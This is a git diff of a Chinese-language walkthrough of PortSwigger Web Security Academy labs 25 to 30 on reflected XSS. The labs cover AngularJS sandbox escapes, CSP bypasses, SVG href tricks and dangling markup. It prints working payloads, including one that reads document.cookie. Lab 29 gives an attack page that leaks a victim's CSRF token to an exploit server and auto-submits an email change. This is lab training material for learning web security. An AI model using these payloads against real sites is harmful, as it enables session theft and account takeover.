-    尝试闭合input并添加新的元素![image-20261113080551282](91.png)
+## 25. Reflected XSS with AngularJS sandbox escape without strings
 
-    然而由于CSP，无法直接执行脚本
+![image-20261113032316857](76.png)
 
-    ![image-20261113081041740](92.png)
+这一题要绕过 AngularJS 沙箱。进入搜索结果页可以看到版本是 1.4.4，仍然包含沙箱：
 
-    所以先生成按钮诱导受害者点击将csrf令牌发至攻击服务器，在用攻击服务器发送更改邮箱请求，添加
+![image-20261113032440503](77.png)
 
-    ```
-    <button formaction="https://exploit-0a3a00d2036e8f5e813d5b04019d00f6.exploit-server.net/exploit" formmethod=get type="submit">Click me</button>
-    ```
+同时可以看到题目使用的函数：
 
-    即可将csrf令牌发送至攻击方的服务器，在检查到csrf令牌后发送更改邮箱请求，在攻击服务器内写下
+![image-20261113033143546](78.png)
 
-    ```
-    <form class="login-form" name="change" action="https://0aed007e03628ff981dc5cf2000a0058.web-security-academy.net/my-account/change-email" method="POST" style="display:none">
-                                <input required type="email" name="email" value="hacker@evil-user.net">
-                                <input required type="hidden" name="csrf" value="">
-    <script>
-    var url=new URL(document.location);
-    var c=url.searchParams.get('csrf');
-    if(c){
-    var f=document.getElementsByName('change')[0];
-    var s=document.getElementsByName('csrf')[0];
-    s.value=c;
-    f.submit();
-    }else{
-    location='https://0aed007e03628ff981dc5cf2000a0058.web-security-academy.net/my-account?email=1@2"><button%20formaction="https://exploit-0a3a00d2036e8f5e813d5b04019d00f6.exploit-server.net/exploit" formmethod=get type="submit">Click%20me</button>';
+由于输入单引号会被编码，这里用 `toString`，并通过 `toString.constructor.prototype.charAt = [].join` 替换 `charAt` 来实现沙箱绕过。因为语句会在替换前解析，只有更内层的命令会用到替换后的 `charAt`；`eval` 被禁用，所以用 `orderBy` 输出。
+
+payload 需要注入到 `$parse(key)` 的 key 中，因此在网址后添加参数：
+
+```
+toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+```
+
+![image-20261113050513162](79.png)
+
+## 26. Reflected XSS with AngularJS sandbox escape and CSP
+
+![image-20261113052924494](80.png)
+
+这一题要同时绕过沙箱和 CSP。Burp 代理历史里可以看到网站的 CSP 设置，它限制脚本只能同源，因此需要用 AngularJS 绕过：
+
+![image-20261113053045607](81.png)
+
+AngularJS 版本与上一题相同，仍需绕过沙箱：
+
+![image-20261113061557201](82.png)
+
+使用 payload：
+
+```
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x'
+```
+
+把它转码后拼到网址上，并在攻击页面用 `location` 跳转：
+
+```html
+<script>
+location='https://0a380007045c6571816f200200060017.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'
+</script>
+```
+
+发送给受害者即可。
+
+## 27. Reflected XSS with event handlers and `href` attributes blocked
+
+![image-20261113063035893](83.png)
+
+这一题禁用了事件和 `href` 属性。爆破后可以看到可用的标签：
+
+![image-20261113065103684](84.png)
+
+`href` 被禁止，但题目又要求用到它，因此用 SVG 的 `animate` 动态给 `a` 标签添加 `href`：
+
+```
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
+```
+
+![image-20261113065914170](85.png)
+
+点击 `Click me` 后即可触发 alert。
+
+## 28. Reflected XSS in a JavaScript URL with some characters blocked
+
+![image-20261113065957605](86.png)
+
+查看源码可以看到，GET 传入的值被拼进了返回的超链接：
+
+![image-20261113073853544](87.png)
+
+尝试修改内容后发现，只要语句能闭合、并且 `postId` 能被找到，就可以被解析；但空格会被转义成 `+`，括号也会被去掉。
+
+![image-20261113074333819](88.png)
+
+因此使用 payload：
+
+```
+5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+```
+
+它先定义一个函数，把 `onerror` 改成 `alert` 并抛出异常 `1337`；再把 `toString` 指向这个函数，通过 `window.''` 调用 `toString`。触发未捕获异常 `1337` 后，`onerror` 执行 `alert`，最后闭合语句。
+
+把 payload 拼到网址后，点击 Back to Blog 即可弹出 alert。
+
+## 29. Reflected XSS protected by very strict CSP, with dangling markup attack
+
+![image-20261113080152340](89.png)
+
+登录题目提供的账号后，在更换邮箱页面通过 GET 传入 `email` 参数，内容会出现在邮箱输入框中，而且被直接写进网址：
+
+![image-20261113080423473](90.png)
+
+尝试闭合 `input` 并添加新元素：
+
+![image-20261113080551282](91.png)
+
+但由于 CSP，无法直接执行脚本：
+
+![image-20261113081041740](92.png)
+
+因此先生成一个按钮，诱导受害者点击，把 CSRF token 发到攻击服务器；攻击服务器拿到 token 后再发送修改邮箱的请求。
+
+添加：
+
+```html
+<button formaction="https://exploit-0a3a00d2036e8f5e813d5b04019d00f6.exploit-server.net/exploit" formmethod=get type="submit">Click me</button>
+```
+
+token 到达攻击服务器后，用下面的表单和脚本修改邮箱：
+
+```html
+<form class="login-form" name="change" action="https://0aed007e03628ff981dc5cf2000a0058.web-security-academy.net/my-account/change-email" method="POST" style="display:none">
+  <input required type="email" name="email" value="hacker@evil-user.net">
+  <input required type="hidden" name="csrf" value="">
+  <script>
+    var url = new URL(document.location);
+    var c = url.searchParams.get('csrf');
+    if (c) {
+      var f = document.getElementsByName('change')[0];
+      var s = document.getElementsByName('csrf')[0];
+      s.value = c;
+      f.submit();
+    } else {
+      location = 'https://0aed007e03628ff981dc5cf2000a0058.web-security-academy.net/my-account?email=1@2"><button%20formaction="https://exploit-0a3a00d2036e8f5e813d5b04019d00f6.exploit-server.net/exploit" formmethod=get type="submit">Click%20me</button>';
     }
-    </script>
-    ```
+  </script>
+</form>
+```
 
-    发送给受害者即可过关
+发送给受害者即可过关。
 
-30. Reflected XSS protected by CSP, with CSP bypass
+## 30. Reflected XSS protected by CSP, with CSP bypass
 
-    ![image-20261113084843405](93.png)
+![image-20261113084843405](93.png)
 
-    在bp的代理历史中观察到这题的csp策略![image-20261113085038659](94.png)
+在 Burp 的代理历史中可以看到这一题的 CSP 策略：
 
-    发现可以注入的参数token，且策略中没有script-src-elem，在输入XSS语句的同时，利用token参数注入script-src-elem unsafe-inline，以覆盖script-src，使得XSS注入的js块可以执行
+![image-20261113085038659](94.png)
 
-    ```
-    <script>alert%281%29<%2Fscript>&token=;script-src-elem%20%27unsafe-inline%27;
-    ```
+策略里没有 `script-src-elem`，同时 `token` 参数可以注入。因此在输入 XSS 语句的同时，用 `token` 注入 `script-src-elem 'unsafe-inline'`，覆盖 `script-src`，让注入的脚本可以执行：
 
-    ![image-20261113085601694](95.png)
+```
+<script>alert%281%29<%2Fscript>&token=;script-src-elem%20%27unsafe-inline%27;
+```
 
-    
-
-    
-
+![image-20261113085601694](95.png)
